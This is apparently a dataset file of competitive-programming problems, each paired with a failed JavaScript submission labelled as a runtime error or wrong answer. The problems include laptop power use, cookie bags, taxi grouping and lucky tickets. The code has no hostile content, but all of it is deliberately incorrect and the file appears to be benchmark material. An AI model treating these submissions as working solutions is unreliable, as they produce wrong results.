{"difficulty":900,"lang":"JavaScript","lang_cluster":"javascript","src_uid":"10_A","submission_id":"15580691","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"var lll = readline().split(' ')\r\nvar n = lll[0]\r\nvar P1 = lll[1]\r\nvar P2 = lll[2]\r\nvar P3 = lll[3]\r\nvar T1 = lll[4]\r\nvar T2 = lll[5]\r\n\r\nvar ss = []\r\n\r\nwhile (lll = readline()) ss.push(lll.split(' '))\r\n\r\nvar pows = 0\r\nvar pse\r\n\r\nfor (var i = 0; i < ss.length; i++) {\r\n  var s = ss[i]\r\n  pows += (s[1] - s[0]) * P1\r\n  if (pse) {\r\n    var w = s[0] - pse\r\n    pows += Math.min(w, T1) * P1\r\n    w -= T1\r\n    if (w) {\r\n      pows += Math.min(w, T2) * P2\r\n      w -= T2\r\n      if (w) {\r\n        pows += w * P3\r\n      }\r\n    }\r\n  }\r\n  pse = s[1]\r\n}\r\n\r\nprint(pows)","description":"Tom is interested in power consumption of his favourite laptop. His laptop has three modes. In normal mode laptop consumes P1 watt per minute. T1 minutes after Tom moved the mouse or touched the keyboard for the last time, a screensaver starts and power consumption changes to P2 watt per minute. Finally, after T2 minutes from the start of the screensaver, laptop switches to the \"sleep\" mode and consumes P3 watt per minute. If Tom moves the mouse or touches the keyboard when the laptop is in the second or in the third mode, it switches to the first (normal) mode. Tom's work with the laptop can be divided into n time periods [l1,r1],[l2,r2],...,[ln,rn]. During each interval Tom continuously moves the mouse and presses buttons on the keyboard. Between the periods Tom stays away from the laptop. Find out the total amount of power consumed by the laptop during the period [l1,rn].","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains 6 integer numbers n, P1, P2, P3, T1, T2 (1\u2264n\u2264100,0\u2264P1,P2,P3\u2264100,1\u2264T1,T2\u226460). The following n lines contain description of Tom's work. Each i-th of these lines contains two space-separated integers li and ri (0\u2264li<ri\u22641440, ri<li+1 for i<n), which stand for the start and the end of the i-th period of work.\n","output_spec":"Output the answer to the problem.\n","notes":null,"sample_inputs":["1 3 2 1 5 10\n0 10\n","2 8 4 2 5 10\n20 30\n50 100\n"],"sample_outputs":["30","570"]}
{"difficulty":900,"lang":"Node.js","lang_cluster":"javascript","src_uid":"129_A","submission_id":"186817284","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\"use strict\";\r\nprocess.stdin.resume();\r\nprocess.stdin.setEncoding(\"utf-8\");\r\n \r\nfunction print(x) {\r\n  console.log(x);\r\n}\r\nlet inputString = \"\";\r\nlet currentLine = 0;\r\n \r\nprocess.stdin.on(\"data\", (inputStdin) => {\r\n  inputString += inputStdin;\r\n});\r\nprocess.stdin.on(\"end\", () => {\r\n  inputString = inputString.split(\"\\n\");\r\n  main();\r\n});\r\nfunction readline() {\r\n  return inputString[currentLine++];\r\n}\r\n \r\n\/\/ ********** Code Start **********\r\n\r\nfunction main() {\r\n  \/\/ your code goes here\r\n  let a = parseInt(readline())\r\nlet bags = readline().split(' ')\r\nlet odd = 0, type = 0;\r\nbags.forEach(x => {\r\n    if(parseInt(x)%2===1)\r\n        odd++;\r\n})\r\nif(odd % 2 === 1)\r\n    type = 1;\r\nelse {\r\n    type = bags.length - odd;\r\n}\r\nprint(type)\r\n\r\n}\r\n","description":"Olga came to visit the twins Anna and Maria and saw that they have many cookies. The cookies are distributed into bags. As there are many cookies, Olga decided that it's no big deal if she steals a bag. However, she doesn't want the sisters to quarrel because of nothing when they divide the cookies. That's why Olga wants to steal a bag with cookies so that the number of cookies in the remaining bags was even, that is, so that Anna and Maria could evenly divide it into two (even 0 remaining cookies will do, just as any other even number). How many ways there are to steal exactly one cookie bag so that the total number of cookies in the remaining bags was even?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (1\u2264n\u2264100) \u2014 the number of cookie bags Anna and Maria have. The second line contains n integers ai (1\u2264ai\u2264100) \u2014 the number of cookies in the i-th bag.\n","output_spec":"Print in the only line the only number \u2014 the sought number of ways. If there are no such ways print 0.\n","notes":"In the first sample Olga should take the only bag so that the twins ended up with the even number of cookies.\nIn the second sample Olga can take any of five bags with two cookies or any of three bags with four cookies \u2014 5+3=8 ways in total.\nIn the third sample, no matter which bag with two cookies Olga chooses, the twins are left with 2*9+99=117 cookies. Thus, Olga has only one option: to take the bag with 99 cookies.\n","sample_inputs":["1\n1\n","10\n1 2 2 3 4 4 4 2 2 2\n","11\n2 2 2 2 2 2 2 2 2 2 99\n"],"sample_outputs":["1\n","8\n","1\n"]}
{"difficulty":1200,"lang":"Node.js","lang_cluster":"javascript","src_uid":"129_B","submission_id":"113654857","tags":["brute+force","dfs+and+similar","graphs","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\"use strict\";\r\n\r\nprocess.stdin.resume();\r\nprocess.stdin.setEncoding(\"utf-8\");\r\n\r\nlet inputString = \"\";\r\nlet currentLine = 0;\r\n\r\nprocess.stdin.on(\"data\", (inputStdin) => {\r\n  inputString += inputStdin;\r\n});\r\n\r\nprocess.stdin.on(\"end\", (_) => {\r\n  inputString = inputString\r\n    .trim()\r\n    .split(\"\\n\")\r\n    .map((string) => {\r\n      return string.trim();\r\n    });\r\n\r\n  main();\r\n});\r\n\r\nfunction readline() {\r\n  return inputString[currentLine++];\r\n}\r\n\/\/ Make a Snippet for the code above this and then write your logic in main();\r\n\r\nfunction main() { \r\n \r\n \r\n       let [n,m] = readline().split(\" \").map(x=>+x);\r\n       \r\n       \r\n         let matrix = [];\r\n  for (let i = 0; i < m; i++) {\r\n    matrix.push(\r\n      readline()\r\n        .split(\" \")\r\n        .map((x) => +x)\r\n    );\r\n  }\r\n       \r\n \r\n       \r\n       studentsAndShoelaces(n,m,matrix);\r\n  \r\n      \r\n    \r\n  \r\n \r\n  \r\n}\r\n \r\n \r\nlet graph = {};\r\nlet counter = 0;\r\n\r\nfunction studentsAndShoelaces(n, m, studentsConnections) {\r\n  graph = {};\r\n  counter = 0;\r\n  for (let i = 0; i < m; i++) {\r\n    const [a, b] = studentsConnections[i];\r\n\r\n    graph[a] ? graph[a].push(b) : (graph[a] = [b]);\r\n\r\n    graph[b] ? graph[b].push(a) : (graph[b] = [a]);\r\n  }\r\n\r\n  removeSingles();\r\n\r\n  console.log(counter);\r\n}\r\n\r\nfunction removeSingles() {\r\n  \/\/   console.log(graph);\r\n\r\n  let toRemoveNodes = [];\r\n  for (const node in graph) {\r\n    if (graph[node].length === 1) {\r\n      toRemoveNodes.push(node);\r\n\r\n      delete graph[node];\r\n    }\r\n  }\r\n\r\n  if (toRemoveNodes.length) {\r\n    for (const node in graph) {\r\n      graph[node] = graph[node].filter((x) => toRemoveNodes.includes(`${x}`));\r\n    }\r\n    counter++;\r\n\r\n    toRemoveNodes = [];\r\n\r\n    removeSingles();\r\n  } else {\r\n    return;\r\n  }\r\n}\r\n\r\n","description":"Anna and Maria are in charge of the math club for junior students. When the club gathers together, the students behave badly. They've brought lots of shoe laces to the club and got tied with each other. Specifically, each string ties together two students. Besides, if two students are tied, then the lace connects the first student with the second one as well as the second student with the first one.To restore order, Anna and Maria do the following. First, for each student Anna finds out what other students he is tied to. If a student is tied to exactly one other student, Anna reprimands him. Then Maria gathers in a single group all the students who have been just reprimanded. She kicks them out from the club. This group of students immediately leaves the club. These students takes with them the laces that used to tie them. Then again for every student Anna finds out how many other students he is tied to and so on. And they do so until Anna can reprimand at least one student.Determine how many groups of students will be kicked out of the club.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m \u2014 the initial number of students and laces (). The students are numbered from 1 to n, and the laces are numbered from 1 to m. Next m lines each contain two integers a and b \u2014 the numbers of students tied by the i-th lace (1\u2264a,b\u2264n,a\u2260b). It is guaranteed that no two students are tied with more than one lace. No lace ties a student to himself.\n","output_spec":"Print the single number \u2014 the number of groups of students that will be kicked out from the club.\n","notes":"In the first sample Anna and Maria won't kick out any group of students \u2014 in the initial position every student is tied to two other students and Anna won't be able to reprimand anyone.\nIn the second sample four students are tied in a chain and two more are running by themselves. First Anna and Maria kick out the two students from both ends of the chain (1 and 4), then \u2014 two other students from the chain (2 and 3). At that the students who are running by themselves will stay in the club.\nIn the third sample Anna and Maria will momentarily kick out all students except for the fourth one and the process stops at that point. The correct answer is one.\n","sample_inputs":["3 3\n1 2\n2 3\n3 1\n","6 3\n1 2\n2 3\n3 4\n","6 5\n1 4\n2 4\n3 4\n5 4\n6 4\n"],"sample_outputs":["0\n","2\n","1\n"]}
{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"136_A","submission_id":"183706017","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"const rl = require('readline').createInterface( process.stdin, process.stdout );\r\n\r\nrl.question( '', ans => {\r\n    let arr;\r\n    rl.on( 'line', line => {\r\n        arr = line.split(\" \");\r\n        solve( arr );\r\n        rl.close();\r\n    } )\r\n} )\r\n\r\nfunction solve( arr ){\r\n    let output = [];\r\n\r\n    arr.map( (n, i) => {\r\n        output[n-1] = i+1;\r\n    } )\r\n\r\n    console.log(output);\r\n}","description":"Little Petya very much likes gifts. Recently he has received a new laptop as a New Year gift from his mother. He immediately decided to give it to somebody else as what can be more pleasant than giving somebody gifts. And on this occasion he organized a New Year party at his place and invited n his friends there.If there's one thing Petya likes more that receiving gifts, that's watching others giving gifts to somebody else. Thus, he safely hid the laptop until the next New Year and made up his mind to watch his friends exchanging gifts while he does not participate in the process. He numbered all his friends with integers from 1 to n. Petya remembered that a friend number i gave a gift to a friend number pi. He also remembered that each of his friends received exactly one gift.Now Petya wants to know for each friend i the number of a friend who has given him a gift.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer n (1\u2264n\u2264100) \u2014 the quantity of friends Petya invited to the party. The second line contains n space-separated integers: the i-th number is pi \u2014 the number of a friend who gave a gift to friend number i. It is guaranteed that each friend received exactly one gift. It is possible that some friends do not share Petya's ideas of giving gifts to somebody else. Those friends gave the gifts to themselves.\n","output_spec":"Print n space-separated integers: the i-th number should equal the number of the friend who gave a gift to friend number i.\n","notes":null,"sample_inputs":["4\n2 3 4 1\n","3\n1 3 2\n","2\n1 2\n"],"sample_outputs":["4 1 2 3\n","1 3 2\n","1 2\n"]}
{"difficulty":1000,"lang":"Node.js","lang_cluster":"javascript","src_uid":"137_B","submission_id":"129149044","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"let i = '';\r\n\r\nprocess.stdin.on('data', c => i += c);\r\nprocess.stdin.on('end', () => {\r\n    const { EOL } = require('os');\r\n\r\n    \/\/ program starts here\r\n    const lines = i.split(EOL);\r\n\r\n    \/\/ get the numbers, sort the numbers, use reduce to count duplicates\r\n    let dupes = 0;\r\n    lines[1].split(\" \").sort().reduce((a, b) => {\r\n        dupes += a === b;\r\n        return b;\r\n    }, undefined);\r\n    console.log(dupes);\r\n})\r\n\r\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,a2,...,an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2264n\u22645000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2264ai\u22645000,1\u2264i\u2264n).\n","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.\n","notes":"The first sample contains the permutation, which is why no replacements are required.\nIn the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.\nIn the third sample we can replace the second element with number 4 and the fourth element with number 2.\n","sample_inputs":["3\n3 1 2\n","2\n2 2\n","5\n5 3 3 3 1\n"],"sample_outputs":["0\n","1\n","2\n"]}
{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"144_A","submission_id":"217048874","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\"use strict\";\r\nprocess.stdin.resume();\r\nprocess.stdin.setEncoding(\"utf-8\");\r\n \r\nfunction print(x) {\r\n  console.log(x);\r\n}\r\nlet inputString = \"\";\r\nlet currentLine = 0;\r\n \r\nprocess.stdin.on(\"data\", (inputStdin) => {\r\n  inputString += inputStdin;\r\n});\r\nprocess.stdin.on('end', _ => {\r\n    inputString = inputString.trim().split('\\n').map(string => {\r\n        return string.trim();\r\n    });\r\n    \r\n    main();    \r\n});\r\nfunction readline() {\r\n  return inputString[currentLine++];\r\n}\r\n \r\n\r\n\/\/ ********** Code Start **********\r\n \r\nfunction main (){\r\n  let n = parseInt(readline())\r\n  let soldiers = readline().split(\" \").map(height => parseInt(height))\r\n  \r\n  let maxIndex = 0;\r\n  let minIndex = 0;\r\n  let maxHeight = soldiers[0];\r\n  let minHeight = soldiers[0];\r\n\r\n  for (let i = 1; i < n; i++) {\r\n    if (soldiers[i] >= maxHeight) {\r\n      maxHeight = soldiers[i];\r\n      maxIndex = i;\r\n    }\r\n\r\n    if (soldiers[i] <= minHeight) {\r\n      minHeight = soldiers[i];\r\n      minIndex = i;\r\n    }\r\n  }\r\n\r\n  let res = 0\r\n  \r\n  if (maxIndex < minIndex) res = (n-1) - minIndex + maxIndex \r\n  if (maxIndex > minIndex) res = (n-1) - minIndex + maxIndex - 1   \r\n\r\n  print(res)\r\n\r\n}","description":"A Ministry for Defense sent a general to inspect the Super Secret Military Squad under the command of the Colonel SuperDuper. Having learned the news, the colonel ordered to all n squad soldiers to line up on the parade ground.By the military charter the soldiers should stand in the order of non-increasing of their height. But as there's virtually no time to do that, the soldiers lined up in the arbitrary order. However, the general is rather short-sighted and he thinks that the soldiers lined up correctly if the first soldier in the line has the maximum height and the last soldier has the minimum height. Please note that the way other solders are positioned does not matter, including the case when there are several soldiers whose height is maximum or minimum. Only the heights of the first and the last soldier are important.For example, the general considers the sequence of heights (4, 3, 4, 2, 1, 1) correct and the sequence (4, 3, 1, 2, 2) wrong.Within one second the colonel can swap any two neighboring soldiers. Help him count the minimum time needed to form a line-up which the general will consider correct.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains the only integer n (2\u2264n\u2264100) which represents the number of soldiers in the line. The second line contains integers a1,a2,...,an (1\u2264ai\u2264100) the values of the soldiers' heights in the order of soldiers' heights' increasing in the order from the beginning of the line to its end. The numbers are space-separated. Numbers a1,a2,...,an are not necessarily different.\n","output_spec":"Print the only integer \u2014 the minimum number of seconds the colonel will need to form a line-up the general will like.\n","notes":"In the first sample the colonel will need to swap the first and second soldier and then the third and fourth soldier. That will take 2 seconds. The resulting position of the soldiers is (44, 33, 22, 11).\nIn the second sample the colonel may swap the soldiers in the following sequence:\n  (10, 10, 58, 31, 63, 40, 76)  (10, 58, 10, 31, 63, 40, 76)  (10, 58, 10, 31, 63, 76, 40)  (10, 58, 10, 31, 76, 63, 40)  (10, 58, 31, 10, 76, 63, 40)  (10, 58, 31, 76, 10, 63, 40)  (10, 58, 31, 76, 63, 10, 40)  (10, 58, 76, 31, 63, 10, 40)  (10, 76, 58, 31, 63, 10, 40)  (76, 10, 58, 31, 63, 10, 40)  (76, 10, 58, 31, 63, 40, 10) ","sample_inputs":["4\n33 44 11 22\n","7\n10 10 58 31 63 40 76\n"],"sample_outputs":["2\n","10\n"]}
{"difficulty":900,"lang":"Node.js","lang_cluster":"javascript","src_uid":"152_A","submission_id":"221854491","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\"use strict\";\r\nprocess.stdin.resume();\r\nprocess.stdin.setEncoding(\"utf-8\");\r\n\r\nfunction print(x) {\r\n  console.log(x);\r\n}\r\nlet inputString = \"\";\r\nlet currentLine = 0;\r\n\r\nprocess.stdin.on(\"data\", (inputStdin) => {\r\n  inputString += inputStdin;\r\n});\r\nprocess.stdin.on(\"end\", () => {\r\n  inputString = inputString.split(\"\\n\");\r\n  main();\r\n});\r\nfunction readline() {\r\n  return inputString[currentLine++];\r\n}\r\n\r\n\/\/ ********** Code Start **********\r\n\r\nfunction main() {\r\n  \/\/ Number \/\/\r\n  \/\/ String \/\/\r\n  let temp = readline()\r\n    .replace(\/\\r\/g, \"\")\r\n    .split(\" \")\r\n    .map((x) => parseInt(x));\r\n  let n = temp[0];\r\n  let m = temp[1];\r\n  let array = [];\r\n  for (let i = 0; i < n; i++) {\r\n    let temp = readline()\r\n      .replace(\/\\r\/g, \"\")\r\n      .split(\"\")\r\n      .map((x) => parseInt(x));\r\n    array.push(temp);\r\n  }\r\n  let count = 0;\r\n  let pointer = 0;\r\n  let marked = [];\r\nwhile (pointer < m) {\r\n  let temp = [];\r\n  for (let i = 0; i < n; i++) {\r\n    temp.push(array[i][pointer]);\r\n  }\r\n  let best = temp.sort(function (a, b) {\r\n    return a - b;\r\n  })[temp.length - 1];\r\n  for (let j = 0; j < temp.length; j++) {\r\n    if (temp[j] == best) {\r\n      let exit = marked.find((item) => item == j + 1);\r\n      if (!exit) {\r\n        marked.push(j + 1);\r\n      }\r\n    }\r\n  }\r\n  pointer++;\r\n}\r\nconsole.log(marked.length);\r\n}\r\n","description":"Vasya, or Mr. Vasily Petrov is a dean of a department in a local university. After the winter exams he got his hands on a group's gradebook.Overall the group has n students. They received marks for m subjects. Each student got a mark from 1 to 9 (inclusive) for each subject.Let's consider a student the best at some subject, if there is no student who got a higher mark for this subject. Let's consider a student successful, if there exists a subject he is the best at.Your task is to find the number of successful students in the group.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2264n,m\u2264100) \u2014 the number of students and the number of subjects, correspondingly. Next n lines each containing m characters describe the gradebook. Each character in the gradebook is a number from 1 to 9. Note that the marks in a rows are not sepatated by spaces.\n","output_spec":"Print the single number \u2014 the number of successful students in the given group.\n","notes":"In the first sample test the student number 1 is the best at subjects 1 and 3, student 2 is the best at subjects 1 and 2, but student 3 isn't the best at any subject.\nIn the second sample test each student is the best at at least one subject.\n","sample_inputs":["3 3\n223\n232\n112\n","3 5\n91728\n11828\n11111\n"],"sample_outputs":["2\n","3\n"]}
{"difficulty":800,"lang":"Node.js","lang_cluster":"javascript","src_uid":"155_A","submission_id":"208273414","tags":["brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"const readLine = require('readline').createInterface({input: process.stdin,output: process.stdout,});\r\n \r\nlet n = false;\r\nreadLine.on('line',\r\n    (w) => {\r\n        if (n === false){\r\n            n = Number(w);\r\n            return;\r\n        }\r\n        const input = w.split(' ')\r\n        let actuacionSorprendente = 0\r\n        let maxNum = input[0];\r\n        let minNum = input[0];\r\n        if (input.length > 1) {\r\n        for (let i = 1; i < input.length; i++) {\r\n            const element = Number(input[i]);\r\n            if (element > maxNum) {\r\n            maxNum = element;\r\n            actuacionSorprendente++\r\n\r\n            }\r\n            if (element < minNum) {\r\n                minNum = element;\r\n                actuacionSorprendente++\r\n            }\r\n        }\r\n        }\r\n        console.log(actuacionSorprendente, maxNum, minNum );\r\n    }\r\n  );","description":"Vasya adores sport programming. He can't write programs but he loves to watch the contests' progress. Vasya even has a favorite coder and Vasya pays special attention to him.One day Vasya decided to collect the results of all contests where his favorite coder participated and track the progress of his coolness. For each contest where this coder participated, he wrote out a single non-negative number \u2014 the number of points his favorite coder earned in the contest. Vasya wrote out the points for the contest in the order, in which the contests run (naturally, no two contests ran simultaneously).Vasya considers a coder's performance in a contest amazing in two situations: he can break either his best or his worst performance record. First, it is amazing if during the contest the coder earns strictly more points that he earned on each past contest. Second, it is amazing if during the contest the coder earns strictly less points that he earned on each past contest. A coder's first contest isn't considered amazing. Now he wants to count the number of amazing performances the coder had throughout his whole history of participating in contests. But the list of earned points turned out long and Vasya can't code... That's why he asks you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the single integer n (1\u2264n\u22641000) \u2014 the number of contests where the coder participated.\nThe next line contains n space-separated non-negative integer numbers \u2014 they are the points which the coder has earned. The points are given in the chronological order. All points do not exceed 10000.\n","output_spec":"Print the single number \u2014 the number of amazing performances the coder has had during his whole history of participating in the contests.\n","notes":"In the first sample the performances number 2 and 3 are amazing.\nIn the second sample the performances number 2, 4, 9 and 10 are amazing.\n","sample_inputs":["5\n100 50 200 150 200\n","10\n4664 6496 5814 7010 5762 5736 6944 4850 3698 7242\n"],"sample_outputs":["2\n","4\n"]}
{"difficulty":1100,"lang":"Node.js","lang_cluster":"javascript","src_uid":"158_B","submission_id":"218529133","tags":["*special","greedy","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"(()=>{\"use strict\";var t={188:function(t,e,n){var o=this&&this.__importDefault||function(t){return t&&t.__esModule?t:{default:t}};Object.defineProperty(e,\"__esModule\",{value:!0}),e.singleWordInput=e.singleInput=e.testInput=void 0;const l=o(n(58)).default.createInterface({input:process.stdin,output:process.stdout});e.testInput=t=>{let e=[],n=0;l.on(\"line\",(function(o){if(e.push(o),1===e.length&&(n=+e[0]),e.length===n+1){e.shift(),l.close();for(let n=0;n<e.length;n++)e[n].split(\" \").map(Number)[0],e[n].split(\" \").map(Number)[1],e[n].split(\" \").map(Number)[2],console.log(t(e[n]))}}))},e.singleInput=t=>{let e=[];l.on(\"line\",(function(n){if(e.push(n),2===e.length){l.close();let n=e[1].split(\" \").map(Number);console.log(t(n))}}))},e.singleWordInput=t=>{let e=[];l.on(\"line\",(function(n){e.push(n),1===e.length&&(l.close(),console.log(t(n)))}))}},58:t=>{t.exports=require(\"readline\")}},e={};function n(o){var l=e[o];if(void 0!==l)return l.exports;var s=e[o]={exports:{}};return t[o].call(s.exports,s,s.exports,n),s.exports}n(188).singleInput((function(t){let e=0,n=0,o=0,l=0;for(const s of t)4===s&&e++,3===s&&l++,2===s&&o++,1===s&&n++;return e+=Math.floor(o\/2),o%=2,l>n?(e+=0!==n?l-n:0,l-=n,e+l+o):(e+=0!==l?n-(n-l):0,n-=l,1===o&&(e++,n=Math.max(o-2,0)),e+Math.floor(n\/4)+(n%4>0?1:0))}))})();","description":"After the lessons n groups of schoolchildren went outside and decided to visit Polycarpus to celebrate his birthday. We know that the i-th group consists of si friends (1\u2264si\u22644), and they want to go to Polycarpus together. They decided to get there by taxi. Each car can carry at most four passengers. What minimum number of cars will the children need if all members of each group should ride in the same taxi (but one taxi can take more than one group)?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u226410^5) \u2014 the number of groups of schoolchildren. The second line contains a sequence of integers s1,s2,...,sn (1\u2264si\u22644). The integers are separated by a space, si is the number of children in the i-th group.\n","output_spec":"Print the single number \u2014 the minimum number of taxis necessary to drive all children to Polycarpus.\n","notes":"In the first test we can sort the children into four cars like this:\n  the third group (consisting of four children),  the fourth group (consisting of three children),  the fifth group (consisting of three children),  the first and the second group (consisting of one and two children, correspondingly). There are other ways to sort the groups into four cars.\n","sample_inputs":["5\n1 2 4 3 3\n","8\n2 3 4 4 2 1 3 1\n"],"sample_outputs":["4\n","5\n"]}
{"difficulty":1100,"lang":"Node.js","lang_cluster":"javascript","src_uid":"160_B","submission_id":"146155155","tags":["greedy","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"let i = '';\nprocess.stdin.on('data', c => i += c);\nprocess.stdin.on('end', () => {\n    const {EOL} = require('os');\n    const lines = i.split(EOL);\n    var n = lines[0];\n    var k = lines[1].split('').map(Number);\n    var l = n;\n    var a = 0;\n    var b = 0;\n    for(var j = 0; j < n; j++){\n        if(k[j] >= k[l]){\n            a++;\n        }else if(k[j] < k[l]){\n            b++;\n        }\n        l++;\n    }\n    if(a == n || b == n){\n        console.log('YES');\n    }else{\n        console.log('NO');\n    }\n});","description":"Each of you probably has your personal experience of riding public transportation and buying tickets. After a person buys a ticket (which traditionally has an even number of digits), he usually checks whether the ticket is lucky. Let us remind you that a ticket is lucky if the sum of digits in its first half matches the sum of digits in its second half.But of course, not every ticket can be lucky. Far from it! Moreover, sometimes one look at a ticket can be enough to say right away that the ticket is not lucky. So, let's consider the following unluckiness criterion that can definitely determine an unlucky ticket. We'll say that a ticket is definitely unlucky if each digit from the first half corresponds to some digit from the second half so that each digit from the first half is strictly less than the corresponding digit from the second one or each digit from the first half is strictly more than the corresponding digit from the second one. Each digit should be used exactly once in the comparisons. In other words, there is such bijective correspondence between the digits of the first and the second half of the ticket, that either each digit of the first half turns out strictly less than the corresponding digit of the second half or each digit of the first half turns out strictly more than the corresponding digit from the second half.For example, ticket 2421 meets the following unluckiness criterion and will not be considered lucky (the sought correspondence is 2>1 and 4>2), ticket 0135 also meets the criterion (the sought correspondence is 0<3 and 1<5), and ticket 3754 does not meet the criterion. You have a ticket in your hands, it contains 2n digits. Your task is to check whether it meets the unluckiness criterion.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u2264100). The second line contains a string that consists of 2n digits and defines your ticket.\n","output_spec":"In the first line print \"YES\" if the ticket meets the unluckiness criterion. Otherwise, print \"NO\" (without the quotes).\n","notes":null,"sample_inputs":["2\n2421\n","2\n0135\n","2\n3754\n"],"sample_outputs":["YES\n","YES\n","NO\n"]}
{"difficulty":1100,"lang":"Node.js","lang_cluster":"javascript","src_uid":"166_A","submission_id":"140684122","tags":["binary+search","implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"\r\nconsole.log(\"hello\")","description":"Another programming contest is over. You got hold of the contest's final results table. The table has the following data. For each team we are shown two numbers: the number of problems and the total penalty time. However, for no team we are shown its final place.You know the rules of comparing the results of two given teams very well. Let's say that team a solved pa problems with total penalty time ta and team b solved pb problems with total penalty time tb. Team a gets a higher place than team b in the end, if it either solved more problems on the contest, or solved the same number of problems but in less total time. In other words, team a gets a higher place than team b in the final results' table if either pa>pb, or pa=pb and ta<tb. It is considered that the teams that solve the same number of problems with the same penalty time share all corresponding places. More formally, let's say there is a group of x teams that solved the same number of problems with the same penalty time. Let's also say that y teams performed better than the teams from this group. In this case all teams from the group share places y+1, y+2, ..., y+x. The teams that performed worse than the teams from this group, get their places in the results table starting from the y+x+1-th place.Your task is to count what number of teams from the given list shared the k-th place. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2264k\u2264n\u226450). Then n lines contain the description of the teams: the i-th line contains two integers pi and ti (1\u2264pi,ti\u226450) \u2014 the number of solved problems and the total penalty time of the i-th team, correspondingly. All numbers in the lines are separated by spaces. \n","output_spec":"In the only line print the sought number of teams that got the k-th place in the final results' table.\n","notes":"The final results' table for the first sample is: \n  1-3 places \u2014 4 solved problems, the penalty time equals 10  4 place \u2014 3 solved problems, the penalty time equals 20  5-6 places \u2014 2 solved problems, the penalty time equals 1  7 place \u2014 1 solved problem, the penalty time equals 10 The table shows that the second place is shared by the teams that solved 4 problems with penalty time 10. There are 3 such teams.\nThe final table for the second sample is:\n  1 place \u2014 5 solved problems, the penalty time equals 3  2-5 places \u2014 3 solved problems, the penalty time equals 1 The table shows that the fourth place is shared by the teams that solved 3 problems with penalty time 1. There are 4 such teams.\n","sample_inputs":["7 2\n4 10\n4 10\n4 10\n3 20\n2 1\n2 1\n1 10\n","5 4\n3 1\n3 1\n5 3\n3 1\n3 1\n"],"sample_outputs":["3\n","4\n"]}
{"difficulty":1100,"lang":"Node.js","lang_cluster":"javascript","src_uid":"169_B","submission_id":"126998327","tags":["greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"const readline = require('readline').createInterface({\n    input: process.stdin,\n    output: process.stdout\n});\n\nlet firstNum, secondNum;\nreadline.on('line', function (line) {\n    if (line !== \"\\n\") {\n        if (!firstNum) {\n            firstNum = line;\n        } else {\n            secondNum = line;\n            const num1 = firstNum.split(\"\");\n            const num2 = secondNum.split(\"\");\n            num2.sort((a, b) => b - a);\n\n            for (let i = 0; i < num1.length; i++) {\n               \n                for (let j = i; j < num2.length; j++) {\n                    if (num1[i] < num2[j]) {\n                        num1[i] = num2[j];\n                        num2.splice(j, 1);\n                    }\n                    else {\n                        break;\n                    }\n                }\n            }\n\n            console.log(num1.join(\"\"));\n\n            process.exit();\n        }\n    }\n});\n \t\t\t  \t\t \t\t      \t\t  \t  \t\t \t\t\t","description":"You are given an integer a that consists of n digits. You are also given a sequence of digits s of length m. The digit in position j (1\u2264j\u2264m) of sequence s means that you can choose an arbitrary position i (1\u2264i\u2264n) in a and replace the digit in the chosen position i with sj. Each element in the sequence s can participate in no more than one replacing operation.Your task is to perform such sequence of replacements, that the given number a gets maximum value. You are allowed to use not all elements from s.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains positive integer a. Its length n is positive and doesn't exceed 10^5. The second line contains sequence of digits s. Its length m is positive and doesn't exceed 10^5. The digits in the sequence s are written consecutively without any separators.\nThe given number a doesn't contain leading zeroes. \n","output_spec":"Print the maximum value that can be obtained from a after a series of replacements. You are allowed to use not all elements from s. The printed number shouldn't contain any leading zeroes.\n","notes":null,"sample_inputs":["1024\n010\n","987\n1234567\n"],"sample_outputs":["1124\n","987\n"]}
